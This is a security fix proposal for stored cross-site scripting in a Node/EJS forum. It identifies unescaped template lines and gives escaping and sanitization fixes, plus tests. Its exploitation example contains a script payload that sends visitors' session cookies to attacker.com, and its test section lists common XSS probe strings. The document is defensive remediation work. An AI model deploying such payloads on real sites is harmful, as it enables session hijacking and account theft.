# XSS Vulnerability Fix Proposal

## Critical Security Issue

**Severity:** HIGH
**Impact:** Cross-Site Scripting (XSS) vulnerability allows attackers to inject and execute arbitrary JavaScript in other users' browsers.

---

## Vulnerable Code Locations

### 1. Thread Content Rendering
**File:** `src/views/forum/thread-detail.ejs`
**Line:** 39

**Current (Vulnerable):**
```ejs
<%- thread.content.replace(/\n/g, '<br>') %>
```

**Issue:** Unescaped EJS output (`<%-`) renders user content as raw HTML, allowing JavaScript execution.

---

### 2. Reply Content Rendering
**File:** `src/views/forum/thread-detail.ejs`
**Line:** 169

**Current (Vulnerable):**
```ejs
<%- reply.content.replace(/\n/g, '<br>') %>
```

**Issue:** Same as above - unescaped content allows XSS.

---

### 3. Search Result Title Highlighting
**File:** `src/views/forum/search.ejs`
**Line:** 99

**Current (Vulnerable):**
```ejs
<%- highlightSearchTerms(result.title, query) %>
```

**Issue:** If `highlightSearchTerms()` function returns HTML with user input, it can inject scripts.

---

### 4. Search Result Excerpt Highlighting
**File:** `src/views/forum/search.ejs`
**Line:** 118

**Current (Vulnerable):**
```ejs
<%- highlightSearchTerms(result.excerpt, query) %>
```

**Issue:** Same as above.

---

## Exploitation Example

### Attack Scenario

1. Attacker creates a new thread with malicious content:
   ```
   Title: "Help needed"
   Content: "Check this out: <script>
     // Steal session cookie
     fetch('https://attacker.com/steal?cookie=' + document.cookie);
     // Deface forum
     document.body.innerHTML = '<h1>Hacked!</h1>';
   </script>"
   ```

2. Any user viewing this thread will:
   - Execute the attacker's JavaScript
   - Send their session cookie to attacker's server
   - See defaced content
   - Potentially have their account compromised

3. Additional attacks possible:
   - Session hijacking
   - Credential theft through fake login forms
   - Redirect to phishing sites
   - Keylogging
   - CSRF attacks from the user's context

---

## Recommended Fixes

### Option A: Server-Side Sanitization (Recommended)

**Advantage:** Most secure, no client-side dependencies
**Effort:** Low

#### Step 1: Create Sanitization Utility

**File:** `src/utils/sanitize.js` (NEW)

```javascript
const validator = require('validator');

/**
 * Sanitize user content for safe HTML rendering
 * @param {string} content - User-generated content
 * @param {boolean} allowLineBreaks - Convert \n to <br>
 * @returns {string} - Safe HTML string
 */
function sanitizeContent(content, allowLineBreaks = true) {
  if (!content || typeof content !== 'string') {
    return '';
  }

  // Escape all HTML entities
  let safe = validator.escape(content);

  // Optionally convert line breaks to <br> tags (now safe)
  if (allowLineBreaks) {
    safe = safe.replace(/\n/g, '<br>');
  }

  return safe;
}

module.exports = { sanitizeContent };
```

#### Step 2: Sanitize in Route Handlers

**File:** `src/routes/forum.js`

**Before rendering threads/replies:**

```javascript
const { sanitizeContent } = require('../utils/sanitize');

// In thread detail route
router.get('/threads/:id', async (req, res) => {
  // ... fetch thread and replies ...

  // Sanitize thread content
  thread.content = sanitizeContent(thread.content, true);

  // Sanitize all reply content
  replies.forEach(reply => {
    reply.content = sanitizeContent(reply.content, true);
  });

  res.render('forum/thread-detail', { thread, replies, ... });
});
```

#### Step 3: Update EJS Templates

**File:** `src/views/forum/thread-detail.ejs`

**Change from:**
```ejs
<%- thread.content.replace(/\n/g, '<br>') %>
```

**To:**
```ejs
<%- thread.content %>
```

**Why:** Content is already sanitized server-side with `<br>` tags safely added.

---

### Option B: Client-Side Sanitization with DOMPurify

**Advantage:** Allows rich text formatting if needed
**Effort:** Medium

#### Step 1: Create Sanitization Helper

**File:** `src/utils/sanitize.js` (NEW)

```javascript
const DOMPurify = require('isomorphic-dompurify');

/**
 * Sanitize user content with DOMPurify
 * @param {string} content - User-generated content
 * @returns {string} - Safe HTML string
 */
function sanitizeContent(content) {
  if (!content || typeof content !== 'string') {
    return '';
  }

  // Convert line breaks to <br> tags
  const withBreaks = content.replace(/\n/g, '<br>');

  // Sanitize with DOMPurify (removes scripts, event handlers, etc.)
  return DOMPurify.sanitize(withBreaks, {
    ALLOWED_TAGS: ['br', 'b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false
  });
}

module.exports = { sanitizeContent };
```

#### Step 2: Same as Option A (sanitize in routes and update templates)

---

### Option C: Simple Escape (Quickest Fix)

**Advantage:** Minimal code change
**Effort:** Very Low
**Limitation:** No line breaks, all content shown as plain text

**Simply change `<%-` to `<%=` in all templates:**

**File:** `src/views/forum/thread-detail.ejs`

**Change:**
```ejs
<%- thread.content.replace(/\n/g, '<br>') %>
```

**To:**
```ejs
<%= thread.content %>
```

**Result:** Content displayed as plain text, line breaks shown as is (no `<br>` conversion).

---

## Search Highlighting Fix

For search results, ensure the `highlightSearchTerms()` function properly escapes content:

**File:** `src/routes/forum.js` or wherever `highlightSearchTerms()` is defined

```javascript
const validator = require('validator');

function highlightSearchTerms(text, query) {
  if (!text || !query) return validator.escape(text || '');

  // Escape text first
  const escaped = validator.escape(text);

  // Escape query too
  const escapedQuery = validator.escape(query);

  // Create safe regex
  const regex = new RegExp(`(${escapedQuery})`, 'gi');

  // Highlight with safe HTML (mark tag has no attributes)
  return escaped.replace(regex, '<mark>$1</mark>');
}
```

Then in templates, use `<%-` ONLY for this pre-sanitized highlighted content:

```ejs
<%- highlightSearchTerms(result.title, query) %>
```

---

## Testing the Fix

### Manual Testing

1. Create thread with XSS payload:
   ```
   <script>alert('XSS')</script>
   <img src=x onerror=alert('XSS')>
   <a href="javascript:alert('XSS')">Click me</a>
   ```

2. Verify in browser:
   - Scripts should NOT execute
   - Content should be displayed as text or safely escaped
   - No JavaScript alerts should appear

### Automated Testing

**File:** `tests/security/xss.test.js` (NEW)

```javascript
const request = require('supertest');
const app = require('../../src/server');

describe('XSS Protection', () => {
  it('should prevent script injection in thread content', async () => {
    const maliciousContent = '<script>alert("XSS")</script>';

    // Create thread with malicious content
    const res = await request(app)
      .post('/forum/threads')
      .send({
        title: 'Test Thread',
        content: maliciousContent,
        _csrf: csrfToken
      });

    expect(res.status).toBe(302); // Redirect on success

    // Fetch thread
    const threadRes = await request(app).get(res.headers.location);

    // Content should be escaped
    expect(threadRes.text).not.toContain('<script>');
    expect(threadRes.text).toContain('&lt;script&gt;');
  });

  it('should prevent event handler injection', async () => {
    const maliciousContent = '<img src=x onerror=alert("XSS")>';

    // Similar test...
  });
});
```

---

## Implementation Checklist

- [ ] Create `src/utils/sanitize.js` with sanitization function
- [ ] Update all thread rendering routes to sanitize content
- [ ] Update all reply rendering routes to sanitize content
- [ ] Fix `thread-detail.ejs` line 39 (thread content)
- [ ] Fix `thread-detail.ejs` line 169 (reply content)
- [ ] Fix `search.ejs` line 99 (search title)
- [ ] Fix `search.ejs` line 118 (search excerpt)
- [ ] Review all other EJS templates for `<%-` usage with user content
- [ ] Create XSS security tests
- [ ] Run all existing tests to ensure no regressions
- [ ] Manual testing with XSS payloads
- [ ] Update security documentation

---

## Additional Recommendations

1. **Content Security Policy (CSP)**
   - Already implemented in `src/middleware/security.js`
   - Consider tightening further: remove `'unsafe-inline'` for scripts if possible

2. **Input Validation**
   - Add maximum length limits for thread/reply content
   - Reject submissions containing obvious script tags before saving

3. **Regular Security Audits**
   - Scan all templates for `<%-` usage monthly
   - Automated tests in CI/CD pipeline

4. **Security Headers Review**
   - Already using Helmet (good!)
   - X-XSS-Protection header (though deprecated, still helps older browsers)

---

## Timeline

**Priority:** CRITICAL - BLOCKING FOR PRODUCTION

**Estimated Effort:** 2-4 hours

**Suggested Approach:**
1. Implement Option A (server-side sanitization) - 1 hour
2. Update all vulnerable templates - 30 minutes
3. Create automated tests - 1 hour
4. Manual testing - 30 minutes
5. Code review - 30 minutes

**Must be completed before production deployment.**

---

## References

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- EJS Documentation (escaping): https://ejs.co/#docs
- DOMPurify: https://github.com/cure53/DOMPurify
- validator.js: https://github.com/validatorjs/validator.js
